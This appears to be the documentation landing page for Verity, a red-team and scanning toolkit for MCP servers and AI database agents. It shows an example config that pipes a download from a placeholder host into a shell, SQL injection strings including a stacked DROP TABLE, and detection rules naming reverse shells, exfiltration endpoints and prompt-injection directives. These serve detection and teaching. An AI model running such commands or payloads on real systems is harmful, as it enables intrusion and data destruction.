# Verity Red Team

**Find the exploitable path before an attacker does.** Verity is a zero-Docker, MCP-native red-team toolkit for MCP servers, AI database agents, and the IDE clients that connect them. It combines static configuration analysis, AST-aware source review, dialect-specific SQL validation, live exploit verification, and an MCP server that lets assistants invoke security tooling directly.

[Quick start](getting-started/installation.md) · [Feature matrix](#feature-matrix) · [Architecture](#architecture) · [Walkthroughs](#end-to-end-walkthroughs)

---

## Why teams adopt Verity

AI agents now hold credentials, execute shell commands, query production databases, and discover tools dynamically. Traditional SAST tools do not understand MCP transport semantics, tool permission scopes, or the difference between a safe parameterized query and an agent-generated SQL string. Verity closes that gap with checks designed for the AI-native stack and with proof-of-exploit verification that runs locally, without Docker, cloud accounts, or production access.

- **Zero-Docker by default.** Four intentionally vulnerable targets run in-process for safe demos and CI.
- **MCP-native.** Scan MCP client configs, server manifests, tool schemas, and transport settings.
- **Database-aware.** Validate SQL across seven dialects and detect BOLA/IDOR patterns in AI database agents.
- **CI-ready.** Deterministic exit codes, JSON/SARIF output, and policy gates for pull requests.
- **Assistant-integrated.** `verity serve` exposes scanning, guarding, oracle, and remediation tools over MCP.

---

## Tier 1 — Must-Have Product Core

The twelve capabilities below are what a team installs Verity for. Everything is
available in the Apache-2.0 Free edition unless the row carries the `[Pro]` badge.

| Feature | Edition | Value Proposition |
| --- | --- | --- |
| Deterministic Multi-Dialect SQL AST Guard (`SqlSecurityGuard`) | Free | Parses model-generated SQL across seven dialects and rejects interpolation, statement stacking, and unbounded reads before execution. |
| Multi-Client AI Workstation Config Discovery (`verity scan`) | Free | Locates every configured MCP server across Claude Desktop, Cursor, Windsurf, VS Code, Cline, Continue, and Zed. |
| Plaintext Secret & DSN Credential Scanner / Redactor | Free | Detects provider tokens and embedded DSNs in MCP environment blocks and reports them with redacted evidence only. |
| Unknown Capability Profiler (UCP) & SHA-256 Rug-Pull Detector | Free | Baselines each server's advertised capability set and flags silent tool-surface changes between scans. |
| Pre-Flight Static Metadata & Tool-Poisoning Screener (13 Rules) | Free | Screens tool names, descriptions, and schema defaults for injection, poisoning, and exfiltration payloads. |
| NoSQL / MongoDB AST Filter & Tenant Guard (`FilterSecurityGuard`) | [Pro] | Parses Mongo filter documents, rejects operator injection, and binds results to the authenticated tenant. |
| Multi-Source OSV v1.6.0 Ingestion & DSU Alias Graph | Free | Correlates GHSA, PyPA, RustSec, and ecosystem aliases into one advisory graph per package. |
| Tri-Layer Structural Fingerprint Matcher & O(1) Index (6k+ Passports) | Free | Identifies which MCP server a schema came from, even when the server name has been spoofed. |
| Pure-Stdlib Agent Security MCP Server (`verity serve`) | Free | Exposes scanning, guarding, oracle, and remediation tooling to assistants with no extra runtime dependency. |
| SemVer Vulnerability Lookup & SQLite Cache Engine | Free | Resolves the vulnerable range for an exact installed version and caches results for offline CI runs. |
| Response Volume Policy & Payload Truncation Guard (`VolumePolicyGuard`) | [Pro] | Caps row counts and payload bytes at runtime, then emits a tamper-evident evidence hash. |
| Supply-Chain Tamper & Drift Detector (`detect-drift`) | Free | Compares pinned manifests against observed server behaviour and fails on unexplained drift. |

---

## Tier 2 — High Customer Need

These thirteen capabilities are requested by teams that already run Tier 1 in
CI. They deepen coverage without changing the install story.

| Feature | Edition | Value Proposition |
| --- | --- | --- |
| OASIS SARIF v2.1.0 Enterprise Compliance Exporter | [Pro] | Emits SARIF 2.1.0 for code-scanning dashboards plus multi-framework compliance bundles. |
| Snowflake Cloud Warehouse Guard (`SnowflakeSecurityGuard`) | [Pro] | Enforces role, stage, and time-travel boundaries on warehouse queries before execution. |
| Zero-Docker In-Memory Demo Targets (`verity test --demo`) | Free | Reproduces SQL injection, BOLA, NoSQL injection, and unsafe execution in-process for safe CI demos. |
| Remote Snapshot Fetcher (ETag) & Air-Gap Fallback | Free | Keeps fingerprint and advisory snapshots current without breaking air-gapped installations. |
| Client Config Hardening & Lossless JSONC Exporter (`export-config`) | Free | Rewrites risky client configs while preserving comments and key order. |
| Bidirectional JSON-RPC Stdio Security Proxy (`McpStdioProxy`) | Free | Enforces policy on tool calls in flight between an IDE client and an untrusted server. |
| Global npm/npx Unconfigured Server Discovery (`--scan-global`) | Free | Finds MCP packages installed on the workstation but never registered with any client. |
| Python MCP Source AST Scanner (`McpAstScannerEngine` - 9 Rules) | Free | Traverses handler source with alias-aware import resolution (`self.imports`) and def-use analysis for `CWE-22`, `CWE-89`, and `CWE-862` alongside eval, shell, deserialization, and XSS sinks. |
| Polyglot Static AST Extractors (10 Languages) | Free | Extracts tool definitions from non-Python MCP servers so fingerprinting works across runtimes. |
| Multi-Server Tool Collision & Shadowing Detector (`ConflictDetector`) | Free | Flags two servers advertising the same tool name with different behaviour. |
| Live Network TCP/HTTP/SSE MCP Listener Scanner (`network-scan`) | Free | Discovers unadvertised MCP endpoints listening on the local network. |
| AST Taint & YARA Threat Engine (`McpSourceScanner`, `ThreatEngine`) | Free | Follows tainted values from tool input to dangerous sinks and matches YARA threat rules. |
| AST Call-Graph Dependency Reachability (`audit-transitive`) | Free | Proves whether a vulnerable helper is actually reachable from an exposed tool. |

---

## Verity Pro

!!! note "Commercial capabilities live in the Pro guide"
    Cloud warehouse and NoSQL guards, OASIS SARIF v2.1.0 compliance export, the extended
    `verity_remediation_ops` action set, and multi-turn Socratic red-teaming are documented —
    together with the graceful degradation contract — in
    [Verity Pro Enterprise Features](pro/enterprise_features.md).

Everything outside the two tiers above — the optional Tier 3 utilities and the
internal Tier 4 QA and regression harnesses — is catalogued in the
[Auxiliary & Benchmark Appendix (Tier 3/4)](reference/auxiliary_and_benchmarks.md).

---

## Customer Pain Points & Problem-to-Solution Playbook

| Pain point | What it looks like in practice | Verity play | Evidence produced |
|---|---|---|---|
| Shadow MCP servers | Unreviewed local servers launched by an IDE with shell access and broad tool scopes | Discover configs, enumerate servers/tools, flag dangerous stdio commands and wildcard permissions | Config findings + tool inventory |
| Hardcoded API keys | Secrets embedded in MCP `env`, client configs, or agent source | Static secret detection plus AST credential checks, with redacted evidence | Rule IDs, file/line, redacted value |
| SQL injection & BOLA in AI DB agents | LLM-constructed SQL or tenant IDs accepted without authorization checks | SqlSecurityGuard parsing + live target verification of injection and cross-tenant access | Query, dialect, exploit result |
| Missing CI/CD security gates | MCP and agent changes merge without security review | Deterministic scanner, severity thresholds, JSON/SARIF artifacts, non-zero exit on policy violation | Pipeline report + exit code |

### 1. Shadow MCP Servers

Shadow servers appear when a developer adds an MCP server locally, grants broad permissions, and never routes the change through review. Verity enumerates configured servers, inspects launch commands, and highlights unsafe transport and permission combinations.

~~~bash
verity scan --config-file ./.mcp/claude_desktop_config.json --fail-on-findings
~~~

Typical dangerous pattern:

~~~json
{
  "mcpServers": {
    "local-ops": {
      "command": "sh",
      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"],
      "permissions": ["*"]
    }
  }
}
~~~

Verity reports **VERITY-STATIC-SHELL-DROPPER** (Remote Shell Dropper Pattern) and **SEC-STATIC-UNSAFE-SHELL-WRAPPER** (Unsafe Shell Wrapper), then recommends pinning the executable, removing shell interpolation, and reducing tool scope.

### 2. Hardcoded API Keys

Secrets in MCP environment blocks are especially risky because configs are often copied between machines, committed to dotfiles repositories, or pasted into issue trackers. Verity detects high-entropy values and provider-specific token formats without transmitting them.

~~~bash
verity scan --config-file ./mcp.json --format json
~~~

Remediation guidance points to OS keychains, short-lived tokens, and scoped environment injection at launch time.

### 3. SQL Injection & BOLA in AI DB Agents

AI database agents frequently build SQL from model output. Verity's SqlSecurityGuard parses the statement for the selected dialect, flags string interpolation, unbounded reads, and missing tenant predicates, then verifies exploitable behavior against a safe target.

~~~bash
verity test --sql "SELECT * FROM invoices; DROP TABLE invoices" --dialect postgres
verity test --target postgres-basic --format json
~~~

The first command rejects stacked statements via `SqlSecurityGuard`. The second proves cross-tenant access (**CWE-639**) and produces a reproducible finding.

### 4. Missing CI/CD Security Gates

Without a gate, MCP configuration and agent code changes merge unreviewed. Add Verity to the pipeline with a severity threshold and publish JSON/SARIF for code scanning dashboards.

~~~bash
verity scan --path . --format json --output verity.json --fail-on-findings
~~~

A non-zero exit fails the job when medium-or-higher findings exist, while SARIF preserves rule metadata for triage.

---

## Feature Matrix

### IDE client coverage

| Client | Discovery | Config scan | Live test | `verity serve` | Notes |
|---|---|---|---|---|---|
| Claude Desktop | Native MCP config | Yes | Yes | Yes | Primary local assistant target |
| Cursor | Native MCP config | Yes | Yes | Yes | Supports project and user configs |
| Windsurf | `mcp_config.json` | Yes | Yes | Yes | Codeium-managed config |
| VS Code | User/workspace MCP config | Yes | Yes | Yes | Workspace overrides user config |
| Cline | `cline_mcp_settings.json` | Yes | Yes | Yes | VS Code extension storage |
| Continue | `~/.continue/config.json` | Yes | Yes | Yes | `mcpServers` block |
| Zed | `settings.json` | Yes | Yes | Yes | `context_servers` block |

### Static rules (13)

| Rule | Name | Detects |
|---|---|---|
| VERITY-STATIC-INJECTION-OVERRIDE | Prompt Injection Instruction Override | Instruction overrides and jailbreak directives embedded in tool or prompt text |
| VERITY-STATIC-INJECTION-DELIMITER | Simulated Delimiter / Hidden Evasion Block | Fake role tags, chat-template markers, and hidden instruction blocks |
| VERITY-STATIC-TOOL-POISONING | Tool Poisoning / Secondary Shadow Functionality | Unadvertised secondary actions such as credential scraping during processing |
| VERITY-STATIC-EXFIL-WEBHOOK | Out-of-Band Data Exfiltration Endpoint | Disposable webhook, request-bin, and OAST collector endpoints |
| VERITY-STATIC-EXFIL-COVERT | Covert Data Transfer / Streaming Exfiltration | Clipboard or conversation streaming to remote hosts and do-not-notify directives |
| VERITY-STATIC-METADATA-SSRF | Cloud Instance Metadata Service SSRF | Link-local metadata endpoints that expose cloud IAM credentials |
| VERITY-STATIC-CREDENTIAL-HARVESTING | Sensitive Credential Value or Key Block | Embedded keys, assigned API credentials, and sensitive path references |
| VERITY-STATIC-SHELL-DROPPER | Remote Shell Dropper Pattern | Remote downloads piped straight into a shell interpreter |
| VERITY-STATIC-SHELL-REVERSE-PIPE | Reverse Shell Network Payload | Reverse shell socket and named-pipe payloads |
| VERITY-STATIC-CODE-EXECUTION | Obfuscated / Dynamic Execution Wrapper | Base64 and encoded command execution wrappers |
| VERITY-STATIC-SHELL-DESTRUCTIVE | Destructive Host Command | Disk-wiping and filesystem-destroying commands |
| VERITY-STATIC-SQL-INJECTION-SCHEMA | SQL Injection Sequence in Schema Defaults | SQL breakout sequences in schema default values |
| VERITY-STATIC-SCRIPT-INJECTION-XSS | Script Injection / Stored XSS in Metadata | Unescaped script tags and javascript pseudo-protocols in metadata |

### AST rules (9)

| Rule | Name | Detects |
|---|---|---|
| VERITY-AST-CWE-94-EVAL | Unsafe Dynamic Code Evaluation (eval/exec) | Direct evaluation of agent-controlled expressions and statements |
| VERITY-AST-CWE-94-COMPILE | Dynamic Code Compilation (compile) | Bytecode built from agent-controlled source strings |
| VERITY-AST-CWE-78-SHELL | Command Injection via shell=True Subprocess | Subprocess calls that pass a string to a shell |
| VERITY-AST-CWE-78-SYSTEM | Direct OS Shell Execution (os.system / os.popen) | Unsanitized shell invocation without argument separation |
| VERITY-AST-CWE-22-TRAVERSAL | Unvalidated Path Traversal / Boundary Breakout | Dynamic paths resolved without canonical containment checks |
| VERITY-AST-CWE-502-PICKLE | Insecure Object Deserialization (pickle/marshal) | Untrusted pickle and marshal blobs that run __reduce__ hooks |
| VERITY-AST-CWE-502-YAML | Insecure YAML Deserialization | yaml.load() without a safe loader |
| VERITY-AST-CWE-79-XSS | Unescaped HTML / Script Injection in Tool Output | Agent input interpolated into markup without escaping |
| VERITY-AST-CWE-862-BOLA | Missing Session Tenant Verification in Multi-Tenant Tool | Tenant-scoped reads that skip the session tenant check |

### SqlSecurityGuard dialects (7)

| Dialect | Flag value | Coverage |
|---|---|---|
| PostgreSQL | `postgres` | Parameterization, tenant predicates, limit checks |
| MySQL | `mysql` | String interpolation, dangerous functions, unbounded reads |
| SQLite | `sqlite` | Injection patterns and pragma risks |
| DuckDB | `duckdb` | Analytical query review and file access |
| T-SQL | `tsql` | Dynamic SQL, `EXEC`, tenant isolation |
| BigQuery | `bigquery` | Dataset scoping, dynamic SQL, cost controls |
| Snowflake | `snowflake` | Role scoping, injection, unbounded reads |

### Zero-Docker vulnerable targets (4)

| Target | CWE | Purpose |
|---|---|---|
| SQLite Basic Target | CWE-89 | Demonstrate SQL injection in a local AI DB agent |
| PostgreSQL Multi-Tenant Target | CWE-639 | Prove BOLA/IDOR across tenants |
| MongoDB NoSQL Target | CWE-943 | Detect NoSQL operator injection |
| MCP Code Execution Target | CWE-94 | Demonstrate unsafe eval/exec through tool input |

### `verity serve` MCP tools (4)

| Tool | Purpose |
|---|---|
| `verity_security_scan` | Run static, AST, and configuration scans |
| `verity_database_guard` | Validate SQL for a selected dialect |
| `verity_database_oracle` | Compare vulnerable and patched behavior |
| `verity_remediation_ops` | Return prioritized fixes with evidence |

---

## Agent-Native MCP Server

`verity serve` speaks stdio or SSE JSON-RPC and exposes four canonical tools.
Each one accepts the same evidence shapes the CLI already produces, so an
assistant never has to reimplement a check.

| Tool | Purpose |
| --- | --- |
| `verity_security_scan` | Run static, AST, and configuration scans and return prioritised findings. |
| `verity_database_guard` | Validate a statement or filter document for a selected dialect. |
| `verity_database_oracle` | Compare vulnerable and patched behaviour to prove a fix. |
| `verity_remediation_ops` | Return prioritised fixes, patches, and wrapper configuration. |

```bash
verity serve --transport stdio
```

---

## Output formats

| Output format | Edition | Typical use |
| --- | --- | --- |
| `--format terminal` | Free | Human-readable summary for a local shell. |
| `--format json` | Free | Machine-readable artifact for pipelines and triage. |
| `--format markdown` | Free | Pull request comment body. |
| `--format html` | Free | Self-contained report for reviewers. |
| `--format sarif` | [Pro] | OASIS SARIF v2.1.0 upload for code-scanning dashboards. |

In Verity Free, `--format sarif` returns `PRO_FEATURE_REQUIRED` (exit code 2); SARIF v2.1.0 export requires `verity-pro`. Specifically, Free emits `"ok": false`, `"verdict": "PRO_REQUIRED"`, and `"error": "PRO_FEATURE_REQUIRED"` with zero partial file writes even when `--output` is supplied; when `verity-pro` is installed, `--format sarif` and `ComplianceReportEngine.generate_bundle()` preserve exact `physicalLocation.region.startLine` (falling back to `startLine: 1` when line info is absent) and `artifactLocation.uri`, and OSV v1.6.0 records store `AIVSS` under `database_specific.aivss`.

---

## Zero-Docker demo targets

Four intentionally vulnerable servers run in-process, so exploit verification
works on a laptop and on an ephemeral CI runner without Docker, cloud accounts,
or production access.

```bash
verity test --target sqlite-basic --demo --format json
verity test --target postgres-basic --demo --format json
verity test --target mongo-basic --demo --format json
verity test --target code-exec-basic --demo --format json
```

Each transcript contains the executed probe, the evidence, and remediation text
for the finding it proves.

---

## Architecture

~~~mermaid
flowchart LR
    subgraph Clients["IDE & Assistant Clients"]
        CD[Claude Desktop]
        CU[Cursor]
        WS[Windsurf]
        VS[VS Code]
        CL[Cline]
        CO[Continue]
        ZD[Zed]
    end

    subgraph Interface["Verity Interface"]
        CLI[verity CLI]
        SRV[verity serve MCP]
        POL[Policy & Thresholds]
    end

    subgraph Engine["Analysis Engine"]
        DISC[Config Discovery]
        STATIC[13 Static Rules]
        AST[9 AST Rules]
        GUARD[SqlSecurityGuard]
        ORACLE[Exploit Oracle]
        FIX[Remediation Planner]
    end

    subgraph Targets["Zero-Docker Targets"]
        T1[SQLite CWE-89]
        T2[PostgreSQL CWE-639]
        T3[MongoDB CWE-943]
        T4[MCP Exec CWE-94]
    end

    subgraph Output["Evidence & Gates"]
        JSON[JSON Report]
        SARIF[SARIF]
        HTML[HTML Summary]
        EXIT[Deterministic Exit Code]
    end

    CD --> CLI
    CU --> CLI
    WS --> CLI
    VS --> CLI
    CL --> CLI
    CO --> CLI
    ZD --> CLI
    CD --> SRV
    CU --> SRV
    WS --> SRV
    VS --> SRV
    CL --> SRV
    CO --> SRV
    ZD --> SRV
    CLI --> DISC
    SRV --> DISC
    DISC --> STATIC
    DISC --> AST
    DISC --> GUARD
    STATIC --> ORACLE
    AST --> ORACLE
    GUARD --> ORACLE
    ORACLE --> T1
    ORACLE --> T2
    ORACLE --> T3
    ORACLE --> T4
    ORACLE --> FIX
    FIX --> JSON
    FIX --> SARIF
    FIX --> HTML
    POL --> EXIT
    JSON --> EXIT
    SARIF --> EXIT
~~~

The CLI and MCP server share one discovery and analysis core, so IDE-driven scans and pipeline scans produce consistent rule IDs and evidence. Targets are isolated in-process, making exploit verification reproducible on laptops and ephemeral CI runners.

---

## End-to-end walkthroughs

### Walkthrough 1: SQLite Basic Target with `verity test --demo`

~~~bash
$ uv run python -c "import verity; print(verity.__version__)"
0.2.2

$ verity test --target sqlite-basic --demo --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.2",
  "target": {
    "name": "sqlite-basic",
    "cwe": "CWE-89",
    "mode": "zero-docker"
  },
  "summary": {
    "tests": 3,
    "passed": 2,
    "failed": 1,
    "highest_severity": "high"
  },
  "findings": [
    {
      "id": "VERITY-STATIC-SQL-INJECTION-SCHEMA",
      "title": "SQL Injection Sequence in Schema Defaults",
      "severity": "high",
      "evidence": {
        "query": "SELECT * FROM users WHERE name = 'admin' OR '1'='1'",
        "result": "authentication_bypass"
      },
      "remediation": "Use parameterized queries and validate model-generated SQL."
    }
  ]
}
~~~

### Walkthrough 2: PostgreSQL Multi-Tenant Target with `verity test --demo`

~~~bash
$ verity test --target postgres-basic --demo --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.2",
  "target": {
    "name": "postgres-basic",
    "cwe": "CWE-639",
    "mode": "zero-docker"
  },
  "summary": {
    "tests": 4,
    "passed": 3,
    "failed": 1,
    "highest_severity": "high"
  },
  "findings": [
    {
      "id": "VERITY-AST-CWE-862-BOLA",
      "title": "Missing Session Tenant Verification in Multi-Tenant Tool",
      "severity": "high",
      "evidence": {
        "authenticated_tenant": "tenant-a",
        "requested_tenant": "tenant-b",
        "records_exposed": 17
      },
      "remediation": "Compare the requested tenant with the session tenant and deny mismatches."
    }
  ]
}
~~~

### Walkthrough 3: MCP Code Execution Target with `verity scan`

~~~bash
$ verity test --target code-exec-basic --format json
~~~

~~~json
{
  "schema_version": "1.0",
  "tool": "verity",
  "version": "0.2.2",
  "scan": {
    "target": "code-exec-basic",
    "cwe": "CWE-94",
    "rules": ["VERITY-AST-CWE-94-EVAL", "VERITY-AST-CWE-862-BOLA", "VERITY-STATIC-SHELL-DROPPER"]
  },
  "summary": {
    "findings": 3,
    "critical": 1,
    "high": 1,
    "medium": 1,
    "exit_code": 1
  },
  "findings": [
    {
      "id": "VERITY-AST-CWE-94-EVAL",
      "title": "Unsafe Dynamic Code Evaluation (eval/exec)",
      "severity": "critical",
      "location": {"file": "agent/tools.py", "line": 42},
      "evidence": {"sink": "eval", "source": "tool_input.code"},
      "remediation": "Replace eval with an allowlisted interpreter."
    },
    {
      "id": "VERITY-AST-CWE-78-SHELL",
      "title": "Command Injection via shell=True Subprocess",
      "severity": "high",
      "location": {"file": "agent/tools.py", "line": 57},
      "evidence": {"sink": "subprocess.run", "shell": true},
      "remediation": "Use argument lists and disable shell execution."
    },
    {
      "id": "VERITY-STATIC-SHELL-DROPPER",
      "title": "Remote Shell Dropper Pattern",
      "severity": "medium",
      "location": {"file": "mcp.json", "line": 8},
      "evidence": {"command": "sh -c"},
      "remediation": "Pin the executable and remove shell interpolation."
    }
  ]
}
~~~

The non-zero exit code fails a CI gate configured with `--fail-on-findings`, while the JSON artifact preserves evidence for review.

---

## Next steps

- [Install Verity](getting-started/installation.md) for your environment.
- Run `verity scan --path . --format terminal` on an existing MCP configuration.
- Add `verity serve` to your IDE and ask the assistant to scan the current workspace.
- Wire `--fail-on-findings` into CI and upload JSON/SARIF artifacts.
